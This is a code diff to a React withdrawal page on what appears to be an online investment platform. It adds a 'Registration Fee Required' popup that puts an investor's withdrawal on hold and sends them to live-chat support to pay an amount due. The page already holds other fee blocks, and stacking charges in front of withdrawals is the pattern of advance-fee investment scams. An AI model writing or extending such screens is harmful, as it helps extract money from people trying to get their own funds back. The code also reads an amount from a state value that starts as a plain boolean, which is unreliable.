@@ -49,6 +49,7 @@ export default function WithdrawNew() {
   const [pendingFees, setPendingFees] = useState([]);
   const [feeBlock, setFeeBlock] = useState(null);
   const [payingFee, setPayingFee] = useState(false);
+  const [regFeeBlock, setRegFeeBlock] = useState(false);
 
   const inputStyle = { width: '100%', background: t.cardBg, border: `1px solid ${t.border}`, color: t.text, fontSize: '9px', padding: '8px 10px', outline: 'none', boxSizing: 'border-box' };
   const labelStyle = { color: t.subText, fontSize: '8px', display: 'block', marginBottom: '6px' };
@@ -191,6 +192,7 @@ export default function WithdrawNew() {
   );
 
   return (
+    <>
     <div style={{ minHeight: '100vh', background: t.bg, fontFamily: "'Segoe UI', sans-serif", color: t.text }}>
       <DashboardSidebar open={sidebarOpen} onClose={() => setSidebarOpen(false)} />
 
@@ -305,5 +307,35 @@ export default function WithdrawNew() {
         </>
       )}
     </div>
+
+      {/* Registration Fee Block Popup */}
+      {regFeeBlock && (
+        <>
+          <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
+          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px' }}>
+            <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
+              <svg width='22' height='22' fill='none' stroke='#ef4444' viewBox='0 0 24 24' strokeWidth='2'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
+            </div>
+            <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '8px' }}>Registration Fee Required</div>
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '16px', lineHeight: '1.8' }}>
+              A Registration Fee is required to fully activate your trading account and unlock complete access to all platform investment and withdrawal features.
+            </div>
+            <div style={{ color: '#888', fontSize: '9px', marginBottom: '4px' }}>Amount Due</div>
+            <div style={{ color: '#ef4444', fontSize: '16px', fontWeight: '700', marginBottom: '16px' }}>${parseFloat(regFeeBlock.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.7' }}>
+              Dear Investor, your withdrawal request is on hold. Please contact support to complete this payment.
+            </div>
+            <button onClick={() => { setRegFeeBlock(false); window.dispatchEvent(new Event('openLiveChat')); }}
+              style={{ width: '100%', padding: '10px', background: '#6366f1', border: 'none', color: 'white', fontSize: '10px', fontWeight: '700', cursor: 'pointer', marginBottom: '8px' }}>
+              Contact Support
+            </button>
+            <button onClick={() => navigate('/dashboard')}
+              style={{ width: '100%', padding: '10px', background: 'transparent', border: '1px solid #e2e8f0', color: '#888', fontSize: '10px', cursor: 'pointer' }}>
+              Go Back
+            </button>
+          </div>
+        </>
+      )}
+    </>
   );
 }
